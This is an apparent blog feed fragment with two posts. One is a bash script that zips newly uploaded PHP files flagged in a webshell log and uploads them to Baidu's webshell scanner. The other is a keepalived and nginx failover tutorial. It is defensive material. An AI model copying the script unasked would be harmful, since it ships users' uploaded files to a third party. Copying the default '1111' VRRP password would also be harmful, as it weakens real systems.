    <published>2017-12-26T00:57:31.000Z</published>
    <updated>2017-12-30T11:55:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author by klion</span><br><span class="line"># 2017.12.25</span><br><span class="line"># Delete webshell auto </span><br><span class="line"></span><br><span class="line">webshell_log=&quot;/var/log/webshell.log&quot;</span><br><span class="line">upload_shell=&quot;/var/log/modify.tmp&quot;</span><br><span class="line"></span><br><span class="line"># 只要一检测到有新事件发生就立马打包上传检测</span><br><span class="line">[ -s $webshell_log ] &amp;&amp;&#123;</span><br><span class="line">    awk -F &quot; &quot; &apos;&#123;print $3&#125;&apos; $webshell_log |grep -E &quot;.php$&quot;| sort -u &gt; $upload_shell</span><br><span class="line">    cat $upload_shell |xargs zip ./maybeshell.zip</span><br><span class="line">    echo `curl https://scanner.baidu.com/enqueue -F archive=@maybeshell.zip` | mail -s &quot;webshell detect url api&quot; klion@protonmail.com </span><br><span class="line">    sleep 5</span><br><span class="line">    &gt; $webshell_log &amp;&amp; &gt; $upload_shell &amp;&amp; rm -fr ./maybeshell.zip</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/img/sync monitor.gif" alt=""><br><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;此脚本需要配合inotify一起使用,<code>当然,你可以用别的目录监控工具</code>,此处主要还是针对用户的上传目录进行监控,想实现的效果也很简单,只要有任何用户往指定目录中上传指定类型的脚本文件<code>这里只截取了php,可以根据实际需求多加一些</code>,就立马记录并打包丢给百度的webshell检测接口,顺便发信通知管理员去看查杀结果,觉得用来抓抓webshell还是蛮不错的,哼哼…毕竟基于shell,比较粗糙,有实际需求的话,大家不妨用py重写下 :)</p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# author by klion&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 2017.12.25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Delete webshell auto &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;webshell_log=&amp;quot;/var/log/webshell.log&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;upload_shell=&amp;quot;/var/log/modify.tmp&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 只要一检测到有新事件发生就立马打包上传检测&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[ -s $webshell_log ] &amp;amp;&amp;amp;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    awk -F &amp;quot; &amp;quot; &amp;apos;&amp;#123;print $3&amp;#125;&amp;apos; $webshell_log |grep -E &amp;quot;.php$&amp;quot;| sort -u &amp;gt; $upload_shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cat $upload_shell |xargs zip ./maybeshell.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    echo `curl https://scanner.baidu.com/enqueue -F archive=@maybeshell.zip` | mail -s &amp;quot;webshell detect url api&amp;quot; klion@protonmail.com &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sleep 5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;gt; $webshell_log &amp;amp;&amp;amp; &amp;gt; $upload_shell &amp;amp;&amp;amp; rm -fr ./maybeshell.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="webhack" scheme="https://evil-404.github.io/categories/webhack/"/>
    
    
      <category term="webhack" scheme="https://evil-404.github.io/tags/webhack/"/>
    
  </entry>
  
  <entry>
    <title>keepalived + nginx 初步实现高可用</title>
    <link href="https://evil-404.github.io/2017-12-24-keepalived-nginx.html"/>
    <id>https://evil-404.github.io/2017-12-24-keepalived-nginx.html</id>
    <published>2017-12-23T20:09:17.000Z</published>
    <updated>2017-12-30T12:06:34.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 keepalived<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">早期是专为 `LVS` 设计的,主要用来监控LVS集群中各个节点状态</span><br><span class="line">内部基于 `VRRP协议` 实现,即`虚拟路由冗余协议`,从名字不难看出,协议本身是用于保证实现路由节点高可用的</span><br></pre></td></tr></table></figure></p><p>0x02 所谓的 VRRP 协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">简单来讲,即将N台提供相同功能的路由器组成一个路由器组,在这个组里有一个master和多个backup</span><br><span class="line">一般情况下,master是由选举算法产生的,另外需要注意的是,只有在 master 上才有一个用于对外提供服务的虚拟ip</span><br><span class="line">其它的backup都是没有的,当master在对外提供服务时,其它的backup又在干什么呢</span><br><span class="line">很简单,当master在对外提供服务时,它同时也在不停的向所有的backup发送VRRP状态信息 `说白点儿就是心跳包`</span><br><span class="line">告诉所有backup们,说,&apos;我还没累死,你们先歇着,等我挂了,你们再上&apos;,然后,所有的backup就会一直在那儿闲着不停地接收这样的状态信息</span><br><span class="line">当某一时刻,backup突然没再接到这样的状态回应时,就说明master已经光荣牺牲了</span><br><span class="line">所有的backup会再重新用选举算法,把优先级最高的backup升级为master继续对外提供服务,以此保证了服务的持续可用性,即所谓的高可用</span><br></pre></td></tr></table></figure></p><p>0x03 借助 keepalived 在web上的高可用实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先,在所有需要进行高可用的web节点机器上部署好keepalived,并在节点中设置一个master,其它的则全部设为backup</span><br><span class="line">一旦backup接收不到来自master的心跳数据,即认为master已挂掉,backup随即就会接管master的所有资源数据</span><br><span class="line">当master状态恢复时,backup会把所有的资源数据再移交给master处理,此,即为最简单的web高可用实现</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Lvsip: 192.168.3.75  虚拟ip: 192.168.3.2    对应域名: reverse.org为keepalived 的MASTER节点</span><br><span class="line">NginxHttpip: 192.168.3.49  对应域名: reverse.org    为keepalived 的BACKUP节点</span><br><span class="line">OldLampip: 192.168.3.45  对应域名: www.bwapp.cc</span><br><span class="line">OldLnmpip: 192.168.3.42  对应域名: test.bwapp.org</span><br></pre></td></tr></table></figure></p><p>0x04 务必保证 <code>Lvs 和 NginxHttp</code> 两台机器上的nginx配置是完全一致的,且nginx服务已处于成功启动状态,具体如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># cat /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    upstream default_pools&#123;</span><br><span class="line">   server test.bwapp.org:80 weight=2;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    upstream static_pools &#123;</span><br><span class="line">   server test.bwapp.org:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    upstream dynamic_pools &#123;</span><br><span class="line">   server www.bwapp.cc:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  reverse.org;</span><br><span class="line">        location / &#123;</span><br><span class="line">    proxy_pass http://default_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">location /static/ &#123;</span><br><span class="line">    proxy_pass http://static_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /dynamic/ &#123;</span><br><span class="line">    proxy_pass http://dynamic_pools;</span><br><span class="line">    proxy_set_header Host  $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x05 首先,同时在 <code>Lvs 和 NginxHttp</code> 这两台机器上安装keepalived并进行启动测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># yum install openssl openssl-devel -y在装nginx其实已经装过</span><br><span class="line"># wget http://www.keepalived.org/software/keepalived-1.3.2.tar.gz</span><br><span class="line"># tar xf keepalived-1.3.2.tar.gz</span><br><span class="line"># cd keepalived-1.3.2</span><br><span class="line"># ln -s /usr/src/kernels/2.6.32-642.el6.x86_64/ /usr/src/linux</span><br><span class="line"># ll /usr/src/linux</span><br><span class="line"># ./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line"># cp /root/keepalived-1.3.2/keepalived/etc/init.d/keepalived /etc/init.d/</span><br><span class="line"># cp /usr/local/etc/sysconfig/keepalived /etc/sysconfig/</span><br><span class="line"># mkdir /etc/keepalived</span><br><span class="line"># cp /usr/local/etc/keepalived/keepalived.conf /etc/keepalived/</span><br><span class="line"># cp /usr/local/sbin/keepalived /usr/sbin/</span><br><span class="line"># /etc/init.d/keepalived start</span><br><span class="line"># ps -ef | grep keepalived看到同时有三个keepalived进程起来,则说明安装成功</span><br><span class="line"># /etc/init.d/keepalived stop之后再停掉keepalived,继续后面的配置</span><br></pre></td></tr></table></figure></p><p>0x06 接着,再来配置<code>master节点的 keepalived.conf</code>,注意,里面只需保留如下配置,其余默认的配置可暂时先全部删掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># man keepalived.conf查看keepalived.conf的详细配置帮助</span><br><span class="line"># cp /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.conf.bak</span><br><span class="line"># vi /etc/keepalived/keepalived.conf</span><br><span class="line">  global_defs &#123; # 全局配置</span><br><span class="line">    notification_email &#123; # 报警通知联系人,该段可直接注释不用</span><br><span class="line">      klionsec@rootkit.org</span><br><span class="line">    &#125;</span><br><span class="line">    notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">    smtp_server 192.168.200.1</span><br><span class="line">    smtp_connect_timeout 30</span><br><span class="line">    router_id LVS_01# 类似mysql的server id</span><br><span class="line">    vrrp_skip_check_adv_addr</span><br><span class="line">!   vrrp_strict# 开启表示严格执行VRRP协议规范,此模式不支持节点单播,默认是开启的,建议关闭,否则你会发现绑不上虚拟ip</span><br><span class="line">    vrrp_garp_interval 0</span><br><span class="line">    vrrp_gna_interval 0</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  # keepalived的一个实例配置</span><br><span class="line">  vrrp_instance VI_1 &#123;  # 设置实例名称</span><br><span class="line">    state MASTER  # 当前实例角色,如,MASTER,BACKUP</span><br><span class="line">    interface eth0  # 发送心跳的网卡接口</span><br><span class="line">    virtual_router_id 51  # 该实例id,MASTER和BACKUP端要保持一致,否则会出现裂脑</span><br><span class="line">    priority 150  # 优先级设置,高的为MASTER,建议节点之间优先级步长为50</span><br><span class="line">    advert_int 1  # 心跳包发送时间间隔,默认为1秒</span><br><span class="line">    authentication &#123;  # MASTER和BACKUP通信验证</span><br><span class="line">       auth_type PASS  # 使用PASS方式</span><br><span class="line">       auth_pass 1111  # 默认密码为1111</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;  # 绑定虚拟ip,相当于 `ip addr add 192.168.3.2/24 dev eth0`的效果</span><br><span class="line">       192.168.3.2/24</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"># scp /etc/keepalived/keepalived.conf root@192.168.3.49:/etc/keepalived/keepalived.conf</span><br><span class="line"># /etc/init.d/keepalived start</span><br><span class="line"># ip addr | grep &quot;192.168.3.2/24&quot;先等一会儿,看下虚拟ip到底有没有加上</span><br></pre></td></tr></table></figure></p><p>0x07 最后,配置<code>backup节点的keepalived.conf</code>,除了<code>server id,实例角色和优先级选项</code>,其余配置和master中的保持一致即可,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/keepalived/keepalived.conf</span><br><span class="line"></span><br><span class="line">  global_defs &#123;</span><br><span class="line">    notification_email &#123;</span><br><span class="line">klionsec@rootkit.org</span><br><span class="line">   &#125;</span><br><span class="line">     notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">     smtp_server 192.168.200.1</span><br><span class="line">     smtp_connect_timeout 30</span><br><span class="line">     router_id LVS_02  # 务必保证id的唯一性,类似mysql的server id</span><br><span class="line">     vrrp_skip_check_adv_addr</span><br><span class="line">!    vrrp_strict</span><br><span class="line">     vrrp_garp_interval 0</span><br><span class="line">     vrrp_gna_interval 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  vrrp_instance VI_1 &#123;    # 两边使用同一个实例</span><br><span class="line">    state BACKUP  # 角色要改</span><br><span class="line">    interface eth0</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 100  # 优先级要小50</span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.3.2/24</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"># /etc/init.d/keepalived start</span><br><span class="line"># ip addr | grep &quot;192.168.3.2/24&quot;  这个ip只有在master挂掉的时候才会有</span><br></pre></td></tr></table></figure></p><p>下面是自动飘ip的实际效果,此时再配合着回想VRRP协议是不是更好理解些呢</p><p><img src="/img/keepalived start status.gif" alt=""></p><p>下面则是模拟keepalived配合nginx 实现web高可用的效果,当MASTER机器不幸down掉时,BACKUP几乎会瞬间接管,以此来保证web服务的持续可用,具体如下</p><p><img src="/img/keepalived nginx.gif" alt=""></p><p>注意,keepalived默认只对<code>系统级别的宕机</code>才会主动接管,对于各类常规服务它是不会自动接管的,解决办法很简单,写个脚本,手动把它俩关联上就好了,此处的所有脚本仅做demo参考,有兴趣请自行加强,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># vi keepalived_nginx_check.sh</span><br><span class="line"># chmod +x keepalived_nginx_check.sh</span><br><span class="line">  #!/bin/bash</span><br><span class="line">  while true</span><br><span class="line">  do</span><br><span class="line">  NginxPid=`ps -C nginx --no-header |wc -l`</span><br><span class="line">  if  [ $NginxPid -eq 2 ]</span><br><span class="line">    then# 检查worker数</span><br><span class="line">/etc/init.d/keepalived stop &amp;&gt;/dev/null # 如果发现worker对不上,就自动让另一台backup去接管</span><br><span class="line">  fi</span><br><span class="line">  sleep 1# 可以时间隔短点,不然,down半天了,那边还没反应</span><br><span class="line">  done</span><br><span class="line"></span><br><span class="line"># ./keepalived_nginx_check.sh &amp;</span><br><span class="line"># ps -ef | grep &quot;keepalived_nginx_check&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/img/keepalived nginx status.gif" alt=""></p><p>0x08 高可用的裂脑问题,所谓的裂脑,即只要backup收不到master发过来的状态信息就以为master挂掉了,但实际上master并没有挂,只是由于一些别的原因导致master和backup之间没法正常的通信,而backup却直接粗暴的理解成master挂掉了,随后就直接就接管资源,这也就导致了裂脑问题的发生,下面是一个检测裂脑的小脚本,原理比较简单,<code>如果我发现master能ping通,但backup本地又有虚拟ip存在,则说明已经裂脑了</code>,用法很简单,直接在backup节点上后台运行该脚本即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># check keepalived status</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    addr=`ip addr | grep &quot;192.168.3.2/24&quot; | wc -l`</span><br><span class="line">    ping -c 5 -W 3 192.168.3.75 &amp;&gt;/dev/null</span><br><span class="line">    if [ $? -eq 0 -a  $addr  -eq 1 ] ;then</span><br><span class="line">        echo &quot;ha is brain.&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;ha is ok&quot;</span><br><span class="line">    fi</span><br><span class="line">    sleep 2</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p><img src="/img/keepalived brain.gif" alt=""></p><p>0x09 keepalived默认的日志在<code>/var/log/messages</code>文件中,不利于分析,所以,实际中最好改下keepalived的默认日志路径,方便后续排查问题,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/sysconfig/keepalived</span><br><span class="line">  KEEPALIVED_OPTIONS=&quot;-D -S 0 -d&quot;</span><br><span class="line"># vi /etc/rsyslog.conf</span><br><span class="line">  local0.*         /var/log/keepalived.log</span><br><span class="line"># /etc/init.d/rsyslog restart</span><br><span class="line"># /etc/init.d/keepalived restart</span><br><span class="line"># tail -f /var/log/keepalived.log</span><br></pre></td></tr></table></figure></p><p><img src="/img/keepalived log.gif" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;篇幅限制,这里仅仅只做了nginx的高可用,关于和LVS的配合应用我们会再单做说明,至于其它的一些基础服务高可用部署方式基本都大同小异,工具比较简单,此处不再赘述,有空的话,大家倒是可以去深入了解下 <code>VRRP</code>  ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 keepalived&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;早期是专为 `LVS` 设计的,主要用来监控LVS集群中各个节点状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;内部基于 `VRRP协议` 实现,即`虚拟路由冗余协议`,从名字不难看出,协议本身是用于保证实现路由节点高可用的&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 所谓的 VRRP 协议&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;简单来讲,即将N台提供相同功能的路由器组成一个路由器组,在这个组里有一个master和多个backup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;一般情况下,master是由选举算法产生的,另外需要注意的是,只有在 master 上才有一个用于对外提供服务的虚拟ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其它的backup都是没有的,当master在对外提供服务时,其它的backup又在干什么呢&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;很简单,当master在对外提供服务时,它同时也在不停的向所有的backup发送VRRP状态信息 `说白点儿就是心跳包`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;告诉所有backup们,说,&amp;apos;我还没累死,你们先歇着,等我挂了,你们再上&amp;apos;,然后,所有的backup就会一直在那儿闲着不停地接收这样的状态信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当某一时刻,backup突然没再接到这样的状态回应时,就说明master已经光荣牺牲了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所有的backup会再重新用选举算法,把优先级最高的backup升级为master继续对外提供服务,以此保证了服务的持续可用性,即所谓的高可用&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 借助 keepalived 在web上的高可用实现&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;首先,在所有需要进行高可用的web节点机器上部署好keepalived,并在节点中设置一个master,其它的则全部设为backup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;一旦backup接收不到来自master的心跳数据,即认为master已挂掉,backup随即就会接管master的所有资源数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当master状态恢复时,backup会把所有的资源数据再移交给master处理,此,即为最简单的web高可用实现&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="keepalived 高可用" scheme="https://evil-404.github.io/categories/keepalived-%E9%AB%98%E5%8F%AF%E7%94%A8/"/>
    
    
      <category term="keepalived 高可用" scheme="https://evil-404.github.io/tags/keepalived-%E9%AB%98%E5%8F%AF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用 `nginx反向代理` 实现的动静分离</title>
    <link href="https://evil-404.github.io/2017-12-22-nginx-static-dynamic.html"/>
    <id>https://evil-404.github.io/2017-12-22-nginx-static-dynamic.html</id>
    <published>2017-12-21T20:09:17.000Z</published>
    <updated>2017-12-30T12:12:56.000Z</updated>
    
